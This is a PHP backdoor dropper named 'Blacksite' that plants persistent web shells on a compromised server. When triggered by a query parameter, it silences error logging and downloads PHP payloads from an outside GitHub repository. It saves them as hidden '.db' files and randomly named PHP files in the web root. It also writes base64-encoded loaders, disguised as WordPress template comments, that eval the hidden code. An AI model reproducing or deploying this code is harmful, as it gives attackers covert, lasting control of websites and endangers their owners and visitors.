<?php
print("<version><center>                                                                
Blacksite[V1.0]</version></center>\n");
@error_reporting(0);
@set_time_limit(0);
@clearstatcache();
@ini_set('error_log', NULL);
@ini_set('log_errors', 0);
@ini_set('display_errors', 0);
$shell_user = posix_getpwuid($uid);
$home_dir = posix_getpwuid(getmyuid())['dir'];
$site = $_SERVER['HTTP_HOST'];
$root = $home_dir . '/';
$dest = $root;
$root2 = $_SERVER['DOCUMENT_ROOT'] . '/';
$g = 'get_';
$c = 'contents';
$fun = $g . $c;
function get_contents($url)
{
    $ch = curl_init("$url");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0(Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_COOKIEJAR, $GLOBALS['coki']);
    curl_setopt($ch, CURLOPT_COOKIEFILE, $GLOBALS['coki']);
    $result = curl_exec($ch);
    return $result;
}
if ($_GET["dz"] == "zone") {
    $htaccess = "https://raw.githubusercontent.com/Dzbackdor/anonymous/main/LiteSpeed.php";
    $file = $fun($htaccess);
    $ra = rand(100, 1000000);
    $fulldest = $dest . '/' . ($_SERVER['HTTP_HOST']) . '.db.878548754';
    $open = fopen($fulldest, 'w');
    fwrite($open, $file);
    fclose($open);
    $name2 = "lite-" . $ra . ".php";
    $engineshell = "PD9waHAKLyoqCiAqIFRoZSB0ZW1wbGF0ZSBmb3IgZGlzcGxheWluZyBzZWFyY2ggcGFnZXMKICoKICogQGxpbmsgaHR0cHM6Ly9kZXZlbG9wZXIud29yZHByZXNzLm9yZy90aGVtZXMvYmFzaWNzL3RlbXBsYXRlLWhpZXJhcmNoeS8KICoKICogQHBhY2thZ2UgUm9zYTIgTGl0ZQogKi8KCiAkc2hlbGxfdXNlciA9IHBvc2l4X2dldHB3dWlkKCR1aWQpOwogJGhvbWVfZGlyID0gcG9zaXhfZ2V0cHd1aWQoZ2V0bXl1aWQoKSlbJ2RpciddOwogJHNpdGUgPSAkX1NFUlZFUlsnSFRUUF9IT1NUJ107CiAkcm9vdCA9ICRob21lX2Rpci4nLyc7CiAkZGVzdCA9ICRyb290OwokYSAgPSAgZmlsZV9nZXRfY29udGVudHMgKCRkZXN0LicvJy4oJF9TRVJWRVJbJ0hUVFBfSE9TVCddKS4nLmRiLjg3ODU0ODc1NCcpOyAKZXZhbCAoICc/PicgLiAkYSApIDs=";
    $name = $root2 . "lite-" . $ra . ".php";
    $openshell = fopen($name, 'w');
    $engineshell = base64_decode($engineshell);
    fwrite($openshell, $engineshell);
    fclose($openshell);
    if ($openshell) {
        echo "<shell>http://$site/$name2</shell><br>";
    } else {
        echo "<br>[-] Error [-]<br>";
    }

    $htaccess21 = "https://raw.githubusercontent.com/Dzbackdor/anonymous/main/image.php";
    //$f = 'file_';
    $g = 'get_';
    $c = 'contents';
    $fun = $g . $c;
    $file = $fun($htaccess21);
    $ra = rand(100, 1000000);
    $open = fopen($root2 . "images-" . $ra . ".php", 'w');
    fwrite($open, $file);
    fclose($open);
    $site = $_SERVER['HTTP_HOST'];
    if ($open) {
        echo "<images>http://$site/images-$ra.php?</images><br>";
    } else {
        echo "<br>[-] Error [-]<br>";
    }
    $htaccess213 = "https://raw.githubusercontent.com/Dzbackdor/anonymous/main/main";
    //$f = 'file_';
    $g = 'get_';
    $c = 'contents';
    $fun = $g . $c;
    $file = $fun($htaccess213);
    $ra = rand(100, 1000000);
    $open = fopen($root2 . "main-" . $ra . ".php", 'w');
    fwrite($open, $file);
    fclose($open);
    $site = $_SERVER['HTTP_HOST'];
    if ($open) {
        echo "<main>http://$site/main-$ra.php</main><br>";
    } else {
        echo "<br>[-] Error [-]<br>";
    }
    $ra2 = rand(100, 1000000);
    $name2leaf = "media-" . $ra2 . ".php";
    $cgi = "https://raw.githubusercontent.com/Dzbackdor/anonymous/main/media_query.php";
    $fulldestleaf = $dest . '/' . ($_SERVER['HTTP_HOST']) . '.db.58742154';
    $file = $fun($cgi);
    $open = fopen($fulldestleaf, 'w');
    fwrite($open, $file);
    fclose($open);
    $engineleaf = "PD9waHAKLyoqCiAqIFRoZSB0ZW1wbGF0ZSBmb3IgZGlzcGxheWluZyBzZWFyY2ggcGFnZXMKICoKICogQGxpbmsgaHR0cHM6Ly9kZXZlbG9wZXIud29yZHByZXNzLm9yZy90aGVtZXMvYmFzaWNzL3RlbXBsYXRlLWhpZXJhcmNoeS8KICoKICogQHBhY2thZ2UgUm9zYTIgTGl0ZQogKi8KCiAkc2hlbGxfdXNlciA9IHBvc2l4X2dldHB3dWlkKCR1aWQpOwogJGhvbWVfZGlyID0gcG9zaXhfZ2V0cHd1aWQoZ2V0bXl1aWQoKSlbJ2RpciddOwogJHNpdGUgPSAkX1NFUlZFUlsnSFRUUF9IT1NUJ107CiAkcm9vdCA9ICRob21lX2Rpci4nLyc7CiAkZGVzdCA9ICRyb290OwokYSAgPSAgZmlsZV9nZXRfY29udGVudHMgKCRkZXN0LicvJy4oJF9TRVJWRVJbJ0hUVFBfSE9TVCddKS4nLmRiLjU4NzQyMTU0Jyk7IApldmFsICggJz8+JyAuICRhICkgOw==";
    $nameleaf = $root2 . "media-" . $ra2 . ".php";
    $openleaf = fopen($nameleaf, 'w');
    $engineleaf = base64_decode($engineleaf);
    fwrite($openleaf, $engineleaf);
    fclose($openleaf);
    $site = $_SERVER['HTTP_HOST'];
    if ($open) {
        echo "<media>http://$site/$name2leaf?</media><br>";
    } else {
        echo "<br>[-] Error [-]<br>";
    }
}
